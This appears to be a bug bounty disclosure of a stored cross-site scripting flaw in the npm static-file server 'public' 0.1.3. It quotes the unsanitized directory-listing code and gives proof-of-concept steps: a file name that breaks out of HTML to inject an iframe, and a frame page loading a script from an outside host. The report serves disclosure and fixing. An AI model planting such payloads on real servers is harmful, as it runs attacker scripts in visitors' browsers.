Summary:

Hi Guys,

**public** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.

**I put https://www.npmjs.com/package/public in Weakness section - 'Where is the stored content accessible?*' because it does not allowed me to open report with http://localhost:8000 - so it's only a placeholder and does not contain any vulnerability!!!**


## Module

**public**

Run static file hosting server with specified public dir & port. Support a "direcotry index" like Apache httpd.

https://www.npmjs.com/package/public

version: 0.1.3

~2600 estimated downloads per year


## Description

This vulnerability exists, because ```file``` which represents filename(s) is output in HTML without any sanitization. 
This allows to embed malicious code in filenames listed in directory.

```javascript
// node_modules/public/bin/public, line 106:
        files.forEach(function(file) {
            list.push('<li><a href="', path.join(base, file),'">', file, '</a></li>');
        });
```
## PoC - Steps To Reproduce:

- install ```public```

```
$ npm install public
```


- in the directory which will be served via ```public```, create file with following name:

```
"><iframe src="malware_frame.html">
```

- create second file with name ```malware_frame.html``` with following content and save it in the same directory:


```
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script type="text/javascript" src="http://bl4de.tech/poc.js"></script>
</body>

</html>
```

Run ```public`` in directory with file with changed filename:

```
$ ./node_modules/public/bin/public ./ 8000
Public.js server running with "/Users/bl4de/playground/node_bugbounty_playground" on port 8000
```

and open ```http://127.0.0.1:8000``` in the browser:

{F263608}


## Supporting Material/References:

## Impact

This vulnerability can be used to eg. download malware via "drive-by-download" attacks. Also, as described in other modules I've reported similar vulnerabilty, an iframe with malicious JS file loaded from external resource can be executed.
